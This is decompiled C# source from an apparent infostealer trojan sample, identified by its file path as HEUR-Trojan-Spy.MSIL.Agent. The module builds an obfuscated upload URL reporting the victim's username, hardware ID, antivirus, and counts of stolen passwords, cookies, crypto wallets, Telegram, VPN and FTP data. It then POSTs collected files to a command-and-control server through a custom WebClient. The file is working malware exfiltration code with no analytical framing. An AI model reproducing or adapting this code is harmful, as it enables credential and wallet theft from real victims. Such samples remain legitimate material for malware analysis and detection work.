// Decompiled with JetBrains decompiler
// Type: AlphaCentavr.metalicagreen
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using rohitry;
using System;
using System.Net;
using System.Security.Authentication;
using System.Text;

namespace AlphaCentavr
{
  internal class metalicagreen
  {
    public static string meringove()
    {
      string s = "files/upgrade.php?user={0}&hwid={1}&antivirus={2}&os={3}&passCount={4}&coockieCount={5}&walletCount={6}&telegramCount={7}&vpnCount={8}&ftpCount={9}&country={10}&searche={11}";
      byte[] bytes = Encoding.GetEncoding(1251).GetBytes(s);
      metalicagreen.XOREncipher(ref bytes, new byte[1]
      {
        (byte) 200
      });
      Console.WriteLine(Encoding.GetEncoding(1251).GetString(bytes));
      metalicagreen.XOREncipher(ref bytes, new byte[1]
      {
        (byte) 200
      });
      return Encoding.GetEncoding(1251).GetString(bytes);
    }

    public static void XOREncipher(ref byte[] Data, byte[] PasswordBytes)
    {
      if (Data == null && PasswordBytes == null)
        return;
      int index1 = 0;
      int index2 = 0;
      while (index2 < Data.Length)
      {
        Data[index2] = checked ((byte) ((int) Data[index2] ^ (int) PasswordBytes[index1]));
        checked { ++index1; }
        if (index1 >= PasswordBytes.Length)
          index1 = 0;
        checked { ++index2; }
      }
    }

    public static void UploadFiler(string path)
    {
      try
      {
        Console.WriteLine("hfhfg!");
        metalicagreen.ExtendedWebClient extendedWebClient = new metalicagreen.ExtendedWebClient();
        extendedWebClient.Timeout = -1;
        extendedWebClient.AllowWriteStreamBuffering = false;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
        extendedWebClient.UploadFile(velelyifanar.yupi + string.Format(metalicagreen.meringove(), (object) Environment.UserName, (object) velelyifanar.HWID, (object) velelyifanar.Ali, (object) velelyifanar.OS, (object) checked (ChelovechkivPope.IYIgh++), (object) checked (ChelovechkivPope.rertrtebvbb++), (object) checked (ChelovechkivPope.zayrt++), (object) checked (ChelovechkivPope.tg++), (object) checked (ChelovechkivPope.NordVPN++), (object) checked (ChelovechkivPope.larertag++), (object) velelyifanar.COU, (object) velelyifanar.searche), "POST", path);
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
    }

    private static string alonso(string hryshovkasisssa) => Encoding.ASCII.GetString(Convert.FromBase64String(hryshovkasisssa));

    public static void baclagan()
    {
      Hernyakakayta.dawnrok();
      benibelvito.SendFile();
    }

    public static class Prazdnik
    {
      public const SecurityProtocolType Tls12 = SecurityProtocolType.Tls12;
      public const SecurityProtocolType Tls11 = SecurityProtocolType.Tls11;
      public const SecurityProtocolType SystemDefault = (SecurityProtocolType) 1;
    }

    public static class SslProtocolsExtensions
    {
      public const SslProtocols Tls12 = SslProtocols.Tls12;
      public const SslProtocols Tls11 = SslProtocols.Tls11;
    }

    public class ExtendedWebClient : WebClient
    {
      public int Timeout { get; set; }

      public new bool AllowWriteStreamBuffering { get; set; }

      protected override WebRequest GetWebRequest(Uri address)
      {
        WebRequest webRequest = base.GetWebRequest(address);
        if (webRequest != null)
        {
          webRequest.Timeout = this.Timeout;
          if (webRequest is HttpWebRequest httpWebRequest)
            httpWebRequest.AllowWriteStreamBuffering = this.AllowWriteStreamBuffering;
        }
        return webRequest;
      }

      public ExtendedWebClient() => this.Timeout = 6000;
    }
  }
}
